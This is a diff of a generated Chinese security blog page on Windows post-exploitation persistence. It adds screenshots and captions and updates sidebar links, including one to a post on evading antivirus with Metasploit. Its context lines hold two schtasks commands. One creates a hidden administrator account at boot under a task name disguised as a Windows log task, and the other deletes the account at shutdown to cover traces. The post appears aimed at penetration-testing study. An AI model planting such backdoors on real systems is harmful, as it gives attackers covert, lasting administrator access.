@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">5.5k</span>阅读时长: <span class="post-count reading-time">22 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">5.6k</span>阅读时长: <span class="post-count reading-time">23 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -632,7 +632,22 @@ height:50vh;
 /?                 显示帮助消息。
 </code></pre><p><strong>设置开机创建账户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;Microsoft\Windows\LocalEventLog&quot; /tr &quot;\&quot;cmd.exe\&quot; /k net user test$ 123456 /add /y /active:yes &gt;&gt; nul &amp; net localgroup administrators test$ /add &gt; nul &amp; net user test$ /comment:\&quot;Built-in account for Backdooring your network suckers\&quot; &gt; nul &amp; exit&quot; /f /ru system /sc onstart</span><br></pre></td></tr></table></figure></p>
 <p><strong>关机删除账户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;Microsoft\Windows\LocalEventLog&quot; /tr &quot;\&quot;cmd.exe\&quot; /k net user test$ /del &gt; nul &amp; exit&quot; /f /ru system /sc onevent /ec System /mo &quot;*[System[EventID=1074]]&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
+<blockquote>
+<p>启动事件</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/09/07/ahPoX3ZWyNYVSsL.jpg" alt></p>
+<blockquote>
+<p>重新开机发现隐藏账户已经建立，但是只有在控制面板和注册表才能发现，而一般人没人点进来看</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/09/07/XQYcRprbKgZCzhG.jpg" alt></p>
+<blockquote>
+<p>开机界面不显示隐藏账户，建立成功<br><img src="https://i.loli.net/2019/09/01/xQo8rtaMUbOpnf4.jpg" alt></p>
+</blockquote>
+<blockquote>
+<p>为了可以快速启动，将命令写成一个bat脚本</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/09/07/CayuEbf8mc3n2LO.jpg" alt></p>
+<p><img src alt><br><img src alt><br><img src alt></p>
 <p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
 <p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
 
@@ -643,13 +658,18 @@ height:50vh;
             <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
             </p><p>原文链接：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">http://yoursite.com/2019/09/01/windows后渗透维权/</a>
             </p><p>发表日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 1st 2019, 12:21:00 am</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 7th 2019, 10:21:56 am</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/09/01/windows后渗透维权/">September 20th 2019, 1:00:18 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/09/20/msf恶意代码免杀总结/" title="msf恶意代码免杀总结">
+                    <div class="nextTitle">msf恶意代码免杀总结</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -1259,9 +1279,26 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 34
+        Total : 35
         </div>
         <!-- search  -->
         
@@ -1274,6 +1311,11 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/2019/09/20/msf恶意代码免杀总结/">msf恶意代码免杀总结</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1452,19 +1494,21 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="逆向,恶意代码"><span class="iconfont-archer">&#xe606;</span>逆向,恶意代码</span>
     
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
-        <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
+        <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
+    
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
     
-        <span class="sidebar-tag-name" data-tags="IDA,OllyDB"><span class="iconfont-archer">&#xe606;</span>IDA,OllyDB</span>
+        <span class="sidebar-tag-name" data-tags="MSF,免杀"><span class="iconfont-archer">&#xe606;</span>MSF,免杀</span>
     
         <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
+    
+        <span class="sidebar-tag-name" data-tags="IDA,OllyDB"><span class="iconfont-archer">&#xe606;</span>IDA,OllyDB</span>
     
         <span class="sidebar-tag-name" data-tags="IIS"><span class="iconfont-archer">&#xe606;</span>IIS</span>
     
@@ -1476,13 +1520,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
     
-        <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
-    
         <span class="sidebar-tag-name" data-tags="域控制器"><span class="iconfont-archer">&#xe606;</span>域控制器</span>
     
-        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
+        <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
     
         <span class="sidebar-tag-name" data-tags="应用层,计算机网络"><span class="iconfont-archer">&#xe606;</span>应用层,计算机网络</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,格式化字符串"><span class="iconfont-archer">&#xe606;</span>pwn,格式化字符串</span>
     
@@ -1549,9 +1593,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
-        <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
-    
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
         <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
